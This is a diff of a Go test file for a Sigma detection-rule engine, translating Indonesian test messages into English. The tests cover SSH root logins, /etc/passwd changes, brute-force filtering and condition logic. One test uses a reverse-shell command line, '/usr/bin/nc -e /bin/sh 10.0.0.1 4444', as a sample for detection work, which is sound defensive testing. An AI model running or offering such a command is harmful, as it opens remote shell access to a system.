@@ -16,20 +16,20 @@ func mustParse(t *testing.T, y string) *Rule {
 	return r
 }
 
-// Memuat rule Sigma asli dari berkas + ekstraksi MITRE + pemetaan DCS.
+// Loads the real Sigma rule from file + MITRE extraction + DCS mapping.
 func TestRealRuleFileSSHRoot(t *testing.T) {
 	data, err := os.ReadFile("../../../rules/sigma/ssh_login_root.yml")
 	if err != nil {
-		t.Fatalf("baca rule: %v", err)
+		t.Fatalf("read rule: %v", err)
 	}
 	r := mustParse(t, string(data))
 
 	tech, tactic := r.MITRE()
 	if tech != "T1078.003" || tactic != "Persistence" {
-		t.Fatalf("MITRE salah: %q / %q", tech, tactic)
+		t.Fatalf("wrong MITRE: %q / %q", tech, tactic)
 	}
 	if r.Severity() != ingest.SeverityMedium {
-		t.Fatalf("severity salah: %v", r.Severity())
+		t.Fatalf("wrong severity: %v", r.Severity())
 	}
 
 	rootLogin := FlattenEvent(&ingest.Event{
@@ -38,25 +38,25 @@ func TestRealRuleFileSSHRoot(t *testing.T) {
 		Source: &ingest.Endpoint{IP: "203.0.113.10"},
 	})
 	if ok, err := r.Matches(rootLogin); err != nil || !ok {
-		t.Fatalf("login root sukses seharusnya cocok (ok=%v err=%v)", ok, err)
+		t.Fatalf("a successful root login should match (ok=%v err=%v)", ok, err)
 	}
 
-	// user lain / outcome lain tidak cocok
+	// a different user / different outcome does not match
 	for _, ev := range []map[string]any{
 		FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "success"}, User: &ingest.User{Name: "deploy"}}),
 		FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Action: "ssh_login", Outcome: "failure"}, User: &ingest.User{Name: "root"}}),
 	} {
 		if ok, _ := r.Matches(ev); ok {
-			t.Fatalf("event ini seharusnya TIDAK cocok: %v", ev)
+			t.Fatalf("this event should NOT match: %v", ev)
 		}
 	}
-	t.Logf("OK: rule Sigma asli ter-parse & cocok; MITRE %s/%s", tech, tactic)
+	t.Logf("OK: real Sigma rule parsed & matched; MITRE %s/%s", tech, tactic)
 }
 
 func TestRealRuleFIMChange(t *testing.T) {
 	data, err := os.ReadFile("../../../rules/sigma/fim_file_change.yml")
 	if err != nil {
-		t.Fatalf("baca rule: %v", err)
+		t.Fatalf("read rule: %v", err)
 	}
 	r := mustParse(t, string(data))
 
@@ -65,14 +65,14 @@ func TestRealRuleFIMChange(t *testing.T) {
 		File:  &ingest.File{Path: "/etc/passwd"},
 	})
 	if ok, err := r.Matches(modified); err != nil || !ok {
-		t.Fatalf("file_modified harus cocok (ok=%v err=%v)", ok, err)
+		t.Fatalf("file_modified should match (ok=%v err=%v)", ok, err)
 	}
 	created := FlattenEvent(&ingest.Event{
 		Event: ingest.EventFields{Category: "file", Action: "file_created"},
 		File:  &ingest.File{Path: "/tmp/new"},
 	})
 	if ok, _ := r.Matches(created); ok {
-		t.Fatal("file_created tidak boleh memicu (hanya modified/deleted)")
+		t.Fatal("file_created must not trigger (only modified/deleted)")
 	}
 }
 
@@ -88,11 +88,11 @@ tags: [attack.t1059]`)
 
 	hit := FlattenEvent(&ingest.Event{Process: &ingest.Process{Name: "nc", CommandLine: "/usr/bin/nc -e /bin/sh 10.0.0.1 4444"}})
 	if ok, err := r.Matches(hit); err != nil || !ok {
-		t.Fatalf("command_line dengan 'nc -e' harus cocok (ok=%v err=%v)", ok, err)
+		t.Fatalf("a command_line with 'nc -e' should match (ok=%v err=%v)", ok, err)
 	}
 	miss := FlattenEvent(&ingest.Event{Process: &ingest.Process{CommandLine: "ls -la"}})
 	if ok, _ := r.Matches(miss); ok {
-		t.Fatal("command biasa tidak boleh cocok")
+		t.Fatal("an ordinary command must not match")
 	}
 }
 
@@ -111,11 +111,11 @@ tags: [attack.t1110]`)
 
 	attacker := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Outcome: "failure"}, User: &ingest.User{Name: "root"}})
 	if ok, _ := r.Matches(attacker); !ok {
-		t.Fatal("kegagalan dari root harus cocok (bukan scanner)")
+		t.Fatal("a failure from root should match (not a scanner)")
 	}
 	scanner := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Outcome: "failure"}, User: &ingest.User{Name: "monitoring"}})
 	if ok, _ := r.Matches(scanner); ok {
-		t.Fatal("kegagalan dari 'monitoring' harus dikecualikan filter")
+		t.Fatal("a failure from 'monitoring' should be excluded by the filter")
 	}
 }
 
@@ -131,13 +131,13 @@ detection:
   condition: 1 of them`)
 
 	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Event: ingest.EventFields{Action: "ssh_login"}})); !ok {
-		t.Fatal("sel_a cocok -> '1 of them' harus true")
+		t.Fatal("sel_a matches -> '1 of them' should be true")
 	}
 	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Process: &ingest.Process{Name: "nc"}})); !ok {
-		t.Fatal("sel_b cocok -> '1 of them' harus true")
+		t.Fatal("sel_b matches -> '1 of them' should be true")
 	}
 	if ok, _ := r.Matches(FlattenEvent(&ingest.Event{Event: ingest.EventFields{Action: "logout"}})); ok {
-		t.Fatal("tak satu pun cocok -> harus false")
+		t.Fatal("none match -> should be false")
 	}
 }
 
@@ -149,7 +149,7 @@ detection:
     event.outcome: failure
   condition: selection | count() by source.ip > 5`))
 	if err == nil {
-		t.Fatal("kondisi agregasi seharusnya ditolak (diarahkan ke jalur SQL)")
+		t.Fatal("an aggregation condition should be rejected (routed to the SQL path)")
 	}
 }
 
@@ -168,11 +168,11 @@ tags: [attack.t1595]`)
 		Original: "Address 1.2.3.4 maps to evil.example, but this does not map back - POSSIBLE BREAK-IN ATTEMPT!",
 	}})
 	if ok, err := r.Matches(hit); err != nil || !ok {
-		t.Fatalf("rule keyword harus cocok: ok=%v err=%v", ok, err)
+		t.Fatalf("the keyword rule should match: ok=%v err=%v", ok, err)
 	}
 	miss := FlattenEvent(&ingest.Event{Event: ingest.EventFields{Dataset: "sshd", Original: "Accepted password for root"}})
 	if ok, _ := r.Matches(miss); ok {
-		t.Fatal("baris log biasa tidak boleh cocok keyword")
+		t.Fatal("an ordinary log line must not match the keyword")
 	}
 }
 
@@ -191,6 +191,6 @@ detection:
 		Source: &ingest.Endpoint{IP: "203.0.113.10"},
 	})
 	if ok, err := r.Matches(ev); err != nil || !ok {
-		t.Fatalf("alias User/src_ip harus resolve ke DCS: ok=%v err=%v", ok, err)
+		t.Fatalf("the User/src_ip aliases should resolve to DCS: ok=%v err=%v", ok, err)
 	}
 }
